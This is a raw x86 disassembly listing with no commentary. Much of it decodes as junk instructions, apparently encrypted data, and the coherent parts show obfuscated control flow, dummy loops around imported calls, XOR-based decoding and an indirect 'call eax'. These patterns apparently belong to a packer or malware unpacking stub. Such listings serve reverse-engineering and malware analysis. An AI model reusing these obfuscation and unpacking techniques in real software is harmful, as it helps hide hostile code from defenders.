  4061ee:	mov    dh,0x32
  4061f0:	jmp    0x4061ec
  4061f2:	clc    
  4061f3:	ror    BYTE PTR [eax-0xc],cl
  4061f6:	mov    ds:0xa7b3efe0,al
  4061fb:	sub    BYTE PTR [eax],ch
  4061fd:	fadd   st(5),st
  4061ff:	mov    al,ds:0xad00344a
  406204:	jp     0x4061ba
  406206:	outs   dx,BYTE PTR ds:[esi]
  406207:	mov    ds:0x35e0b9dd,al
  40620c:	push   ecx
  40620d:	mov    al,ds:0x7225170a
  406212:	inc    ebp
  406213:	xchg   cl,cl
  406215:	aad    0xc7
  406217:	fsubr  DWORD PTR [ecx+edx*8-0xc]
  40621b:	push   esi
  40621c:	call   0xf690:0x892c011
  406223:	test   eax,0x76186c8
  406228:	sub    ch,ch
  40622a:	sahf   
  40622b:	adc    DWORD PTR [eax],0x2b
  40622e:	inc    ebp
  40622f:	fmul   QWORD PTR [eax+0xe8eb1cc]
  406235:	rcr    BYTE PTR [ebx+0x1bc4559f],0xb
  40623c:	pop    ds
  40623d:	sbb    ecx,DWORD PTR [ecx-0x5d]
  406240:	jmp    0x2ce26157
  406245:	xlat   BYTE PTR ds:[ebx]
  406246:	dec    esi
  406247:	aas    
  406248:	push   es
  406249:	sub    al,0x24
  40624b:	sbb    ecx,DWORD PTR [eax+0x5b]
  40624e:	cmp    ebp,esp
  406250:	(bad)
  406253:	jns    0x4062b0
  406255:	sahf   
  406256:	ins    DWORD PTR es:[edi],dx
  406257:	xor    esp,DWORD PTR [ebx+0x72]
  40625a:	js     0x40627a
  40625c:	cmp    cl,BYTE PTR [eax*4+0x31c9a4aa]
  406263:	leave  
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433723,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433723
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433723,ecx
  406282:	cmp    DWORD PTR ds:0x433723,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433723,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433723,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433723
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433723,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406312:	mov    WORD PTR [ebx+0x7e3f54cb],fs
  406318:	jle    0x406346
  40631a:	jge    0x40639a
  40631c:	jle    0x4062ea
  40631e:	inc    edi
  40631f:	dec    ecx
  406320:	mov    dl,0xce
  406322:	mov    ecx,DWORD PTR [ecx+0x3]
  406325:	icebp  
  406326:	push   ss
  406327:	fsubr  DWORD PTR [edi+0x259f52e6]
  40632d:	or     ebp,0xffffffb9
  406330:	push   0x5103c5d6
  406335:	in     al,0x8f
  406337:	stos   DWORD PTR es:[edi],eax
  406338:	inc    esp
  406339:	sub    BYTE PTR [edx+ecx*2],dh
  40633c:	jmp    0x4e5329df
  406341:	mov    eax,0xf485bffe
  406346:	pop    esi
  406347:	popa   
  406348:	arpl   WORD PTR [ebp-0x5a9d646d],di
  40634e:	shl    BYTE PTR [eax-0x2bfd63b],0x71
  406355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406356:	sahf   
  406357:	shl    al,1
  406359:	sub    DWORD PTR [esi-0x6],ebp
  40635c:	jp     0x40631c
  40635e:	add    edx,DWORD PTR [ecx]
  406360:	xchg   DWORD PTR [ecx+0xaf6b7d2],esp
  406366:	stos   DWORD PTR es:[edi],eax
  406367:	aas    
  406368:	mov    ah,0x45
  40636a:	fs jl  0x4063d1
  40636d:	push   0x70
  40636f:	mov    BYTE PTR [ebx],cl
  406371:	(bad)  
  406372:	daa    
  406373:	sbb    al,0x72
  406375:	(bad)  
  406376:	push   ecx
  406377:	jmp    esi
  406379:	clc    
  40637a:	(bad)  
  40637b:	mov    eax,DWORD PTR [edx+0x6e0c89b2]
  406381:	add    eax,0x1fa426f7
  406386:	xchg   BYTE PTR [esi+0x3a],al
  406389:	(bad)  
  40638a:	lds    esi,FWORD PTR [eax]
  40638c:	mov    esp,0x64f70743
  406391:	fadd   DWORD PTR [esi-0x2d46a7f3]
  406397:	hlt    
  406398:	cmp    eax,0xca2729d
  40639d:	and    ch,bh
  40639f:	or     al,0x27
  4063a1:	test   DWORD PTR [edx],ebp
  4063a3:	dec    ecx
  4063a4:	out    0x9d,al
  4063a6:	xchg   ecx,eax
  4063a7:	push   0x7d
  4063a9:	mov    ebx,0xe36ddaa5
  4063ae:	mov    dl,0x1a
  4063b0:	shl    BYTE PTR [ecx-0xef192f2],cl
  4063b6:	sar    BYTE PTR [ecx-0x71],1
  4063b9:	leave  
  4063ba:	inc    edx
  4063bb:	and    al,0x4e
  4063bd:	in     al,dx
  4063be:	push   ss
  4063bf:	push   DWORD PTR [esi+ecx*8-0x390e3fc6]
  4063c6:	loope  0x4063cd
  4063c8:	pop    ecx
  4063c9:	adc    eax,0xae162410
  4063ce:	in     eax,0xe9
  4063d0:	ins    BYTE PTR es:[edi],dx
  4063d1:	mov    eax,ds:0xaebf6a26
  4063d6:	mov    bh,0x68
  4063d8:	cmp    cl,BYTE PTR [edx+0x162ac2aa]
  4063de:	retf   0xfed7
  4063e1:	xchg   ebp,eax
  4063e2:	dec    edx
  4063e3:	mov    bl,0xbf
  4063e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063e6:	sti    
  4063e7:	push   0xc3358731
  4063ec:	frstor [ecx-0x6ac47ed8]
  4063f2:	(bad)  
  4063f3:	cmc    
  4063f4:	dec    ebp
  4063f5:	add    DWORD PTR [ecx],ecx
  4063f7:	gs mov ch,0x4e
  4063fa:	cmc    
  4063fb:	imul   ebp,esp,0xffffffa8
  4063fe:	push   ds
  4063ff:	jmp    FWORD PTR [ecx+0x27]
  406402:	adc    dl,BYTE PTR [ecx]
  406404:	sub    esi,DWORD PTR [edx-0x68]
  406407:	enter  0x8942,0x90
  40640b:	push   ecx
  40640c:	cli    
  40640d:	mov    ch,0x93
  40640f:	xchg   ebp,eax
  406410:	inc    edi
  406411:	mov    edx,0xfd3a4acd
  406416:	and    eax,0x272ca4a0
  40641b:	das    
  40641c:	xchg   ecx,eax
  40641d:	inc    edi
  40641e:	out    0x7d,al
  406420:	outs   dx,DWORD PTR ds:[esi]
  406421:	popa   
  406422:	pop    ss
  406423:	stos   BYTE PTR es:[edi],al
  406424:	dec    esi
  406425:	cwde   
  406426:	pop    ebp
  406427:	imul   BYTE PTR [edx-0x2972a8db]
  40642d:	retf   
  40642e:	out    dx,al
  40642f:	sbb    eax,0x4dde5834
  406434:	mov    esp,0x509114c2
  406439:	mov    eax,ds:0x3aeb453d
  40643e:	dec    BYTE PTR [ecx+0x37]
  406441:	shl    BYTE PTR [ebx+eiz*4+0x558cd628],cl
  406448:	adc    esp,DWORD PTR [ebp-0x7]
  40644b:	jo     0x4063fb
  40644d:	mov    ch,0x58
  40644f:	and    al,0x7e
  406451:	jge    0x40646c
  406453:	adc    BYTE PTR [edi+0x6f04a08f],ah
  406459:	and    ecx,DWORD PTR ss:[esi]
  40645c:	test   DWORD PTR [edx+0x3c],esp
  40645f:	xor    BYTE PTR [ebx],bl
  406461:	lods   al,BYTE PTR ds:[esi]
  406462:	adc    DWORD PTR [ebp-0x23191994],0xe7880db2
  40646c:	cmp    BYTE PTR [ebx-0x1e7e56dd],al
  406472:	out    dx,al
  406473:	inc    ebx
  406474:	sub    al,0x8b
  406476:	or     DWORD PTR [edi+edi*8-0x67110abd],ebp
  40647d:	mov    ch,cl
  40647f:	sbb    edx,esi
  406481:	inc    edx
  406482:	adc    eax,0xfe11720f
  406487:	iret   
  406488:	mov    ah,0x9
  40648a:	adc    eax,0x8da4af45
  40648f:	pop    eax
  406490:	stos   DWORD PTR es:[edi],eax
  406491:	and    bl,BYTE PTR ds:0xc0f80c5d
  406497:	arpl   bx,di
  406499:	xchg   ecx,eax
  40649a:	jmp    0x2a262894
  40649f:	mov    ds:0xbd1b9ea4,al
  4064a4:	test   BYTE PTR [ecx],bh
  4064a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064a7:	xor    dl,BYTE PTR [edi+0x38]
  4064aa:	fdiv   QWORD PTR [esi+0xbdcf28c]
  4064b0:	inc    esp
  4064b1:	xchg   DWORD PTR [ebp-0x77],edx
  4064b4:	or     DWORD PTR ds:0x921106ef,ecx
  4064ba:	push   ecx
  4064bb:	icebp  
  4064bc:	sub    dl,BYTE PTR [eax-0x12]
  4064bf:	mov    al,0x8
  4064c1:	loope  0x4064af
  4064c3:	adc    eax,0xd7988d7c
  4064c8:	add    edi,DWORD PTR [ebx-0xceba67f]
  4064ce:	or     eax,0x5a240b5d
  4064d3:	and    eax,0x2fe171db
  4064d8:	mov    ebx,0x5fe42d67
  4064dd:	sbb    BYTE PTR [ecx+0x7a],ah
  4064e0:	mov    gs,WORD PTR [eax+0x1e]
  4064e3:	fwait
  4064e4:	mov    cl,0xaa
  4064e6:	push   0xffffffd1
  4064e8:	ja     0x40651e
  4064ea:	push   0xca416f65
  4064ef:	mov    edi,0x63a9929
  4064f4:	dec    ebx
  4064f5:	sbb    BYTE PTR [edx],al
  4064f7:	inc    edi
  4064f8:	iret   
  4064f9:	xchg   BYTE PTR [edi],bh
  4064fb:	in     eax,0x48
  4064fd:	pop    ebp
  4064fe:	mov    dl,0x92
  406500:	cmc    
  406501:	and    eax,0x16a24c8e
  406506:	pop    ss
  406507:	xchg   BYTE PTR [eax-0x30],ch
  40650a:	lds    edx,FWORD PTR [ecx]
  40650c:	lods   eax,DWORD PTR fs:[esi]
  40650e:	and    al,0x73
  406510:	mov    DWORD PTR [ecx-0x7c],ebp
  406513:	hlt    
  406514:	mov    cl,0xff
  406516:	xor    BYTE PTR [ebp+0x65bdd997],bh
  40651c:	or     al,0xba
  40651e:	repz in al,dx
  406520:	dec    edx
  406521:	cld    
  406522:	mov    dh,bh
  406524:	mov    BYTE PTR [esi],0x4b
  406527:	or     DWORD PTR [edi-0x46],ebp
  40652a:	xor    al,BYTE PTR [edi+0x434e5adf]
  406530:	push   eax
  406531:	mov    ecx,0x764abe2b
  406536:	pop    ss
  406537:	out    0x5a,eax
  406539:	jl     0x40650f
  40653b:	pop    edx
  40653c:	jo     0x406515
  40653e:	xchg   ebx,eax
  40653f:	pop    ebp
  406540:	icebp  
  406541:	jno    0x406517
  406543:	inc    ebx
  406544:	repz and bh,dl
  406547:	jbe    0x406560
  406549:	into   
  40654a:	push   ss
  40654b:	mov    bh,0x9f
  40654d:	or     BYTE PTR [ebx],0x95
  406550:	adc    al,BYTE PTR [ebx]
  406552:	in     al,0xbb
  406554:	(bad)  
  406556:	cmp    al,0x55
  406558:	jns    0x4064eb
  40655a:	push   edi
  40655b:	push   eax
  40655c:	cmp    al,0xc5
  40655e:	adc    eax,0x4f9070fa
  406563:	pop    esi
  406564:	pop    esp
  406565:	dec    edx
  406566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406567:	sbb    BYTE PTR [edi-0x3f],cl
  40656a:	mov    cl,0xe9
  40656c:	xlat   BYTE PTR ds:[ebx]
  40656d:	inc    eax
  40656e:	xlat   BYTE PTR ds:[ebx]
  40656f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406570:	push   es
  406571:	mov    ds:0xbebf3350,al
  406576:	push   esi
  406577:	ret    
  406578:	mov    BYTE PTR [edi+0x4ac2401c],dl
  40657e:	pop    esp
  40657f:	push   esi
  406580:	iret   
  406581:	push   edi
  406582:	mov    BYTE PTR [ecx],bl
  406584:	in     eax,0xc5
  406586:	sub    al,BYTE PTR [ebp+eax*8-0x43975a20]
  40658d:	stc    
  40658e:	inc    ebx
  40658f:	add    ebx,DWORD PTR [ebp+ebp*4-0x58]
  406593:	pop    es
  406594:	(bad)  
  406595:	pause  
  406597:	or     ecx,DWORD PTR [eax]
  406599:	popf   
  40659a:	xchg   ebx,eax
  40659b:	xor    DWORD PTR [ebp-0x19],0x6bb5c661
  4065a2:	(bad)  
  4065a3:	xchg   edi,eax
  4065a4:	xchg   edi,eax
  4065a5:	and    BYTE PTR [eax-0x7d1ee625],dl
  4065ab:	or     BYTE PTR [eax],dh
  4065ad:	push   ecx
  4065ae:	inc    ecx
  4065af:	xchg   ebx,eax
  4065b0:	push   esp
  4065b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b2:	aam    0x56
  4065b4:	xchg   edi,eax
  4065b5:	inc    ecx
  4065b6:	inc    ebp
  4065b7:	push   ecx
  4065b8:	and    al,0x7
  4065ba:	call   0x83cd:0x2f2b9f33
  4065c1:	js     0x406641
  4065c3:	sbb    bh,BYTE PTR [ebx-0x32411a10]
  4065c9:	jl     0x40659d
  4065cb:	fld    QWORD PTR [eax+0x7b]
  4065ce:	xor    ecx,DWORD PTR [ecx-0xa]
  4065d1:	and    eax,0x46298b10
  4065d6:	and    DWORD PTR [ebx+ebx*8-0xf],ebx
  4065da:	xlat   BYTE PTR ds:[ebx]
  4065db:	fld    QWORD PTR [edi+0x474a8afb]
  4065e1:	jno    0x406611
  4065e3:	cmp    dh,BYTE PTR [esi-0x7831f4e7]
  4065e9:	pop    ebp
  4065ea:	mov    cl,0x1f
  4065ec:	jmp    0x40664b
  4065ee:	sbb    eax,0x4e525f54
  4065f3:	push   edi
  4065f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065f5:	mov    ds:0x47b90ad3,eax
  4065fa:	jnp    0x40659e
  4065fc:	mov    ds:0x8695bc2f,al
  406601:	lahf   
  406602:	fnstcw WORD PTR [edx+0x12]
  406605:	mov    ah,0xa0
  406607:	ss push esi
  406609:	dec    esi
  40660a:	aam    0x4c
  40660c:	sbb    BYTE PTR [eax],0xdc
  40660f:	in     al,0xc7
  406611:	pop    ebp
  406612:	dec    ecx
  406613:	ror    ch,0xa3
  406616:	call   0xa9848e8f
  40661b:	(bad)  
  40661d:	pop    esi
  40661e:	stc    
  40661f:	mov    dl,0x5d
  406621:	mov    DWORD PTR [edx+0x1c],esi
  406624:	(bad)  
  406625:	mov    bl,0x4
  406627:	mov    al,ds:0xb21f8215
  40662c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40662d:	nop
  40662e:	mov    dl,0x56
  406630:	xchg   esp,eax
  406631:	sub    DWORD PTR ds:0xc0ada8ca,esi
  406637:	cdq    
  406638:	add    al,0x86
  40663a:	or     al,0xe
  40663c:	pop    ebx
  40663d:	popa   
  40663e:	cmp    cl,BYTE PTR ds:0x7ec7ecd
  406644:	add    al,0x90
  406646:	jb     0x40669b
  406648:	and    BYTE PTR [edx-0x7a],dh
  40664b:	pop    ecx
  40664c:	dec    ebx
  40664d:	fld    TBYTE PTR [edx]
  40664f:	call   eax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4335fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4336d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4336a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4336e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4336e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4336e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4336e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433803
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4336e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4336e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4336e3,ecx
  406714:	cmp    DWORD PTR ds:0x4336e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4336d7
  406728:	and    ecx,DWORD PTR ds:0x43360f
  40672e:	mov    DWORD PTR ds:0x4336d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43361b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43372b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433613,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43366b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433607,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433607
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433607,ebx
  40677d:	cmp    DWORD PTR ds:0x433607,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433607,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433833
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4336ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433697,0x4336a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4336d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43366b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433613,0x43369f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433607,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4336af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4336e3
  40683c:	and    DWORD PTR ds:0x4336a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43372b
  40684d:	or     DWORD PTR ds:0x4336e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43365b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43371f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4336ab
  406870:	sub    DWORD PTR ds:0x4336d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43360b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433607,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433613,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43360f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433623,0x43372b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43369b,0x4336df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4336e7,0x433693
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433653,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43365b,0x4336ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4336ab,0x43366f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43365b,0x43369b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4335fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4335fb,0x433623
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4336db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4335ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4336ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43371b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43371b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43371b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43371b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43371b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433697
  4069db:	adc    ecx,DWORD PTR ds:0x43365f
  4069e1:	mov    DWORD PTR ds:0x433697,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433693,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433667,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433693,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43360f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43369b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43361b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4336d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xadc72d5f
  406b85:	scas   eax,DWORD PTR es:[edi]
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0xcc7e7e7f
  406b8f:	cmp    DWORD PTR [edi+ebp*8],0x4b50c390
  406b96:	lahf   
  406b97:	jge    0x406be9
  406b99:	pop    ebx
  406b9a:	cmp    esi,DWORD PTR [ebx-0x20]
  406b9d:	pop    edi
  406b9e:	daa    
  406b9f:	sub    ch,BYTE PTR [ecx]
  406ba1:	bound  edi,QWORD PTR [ebx+0x7c]
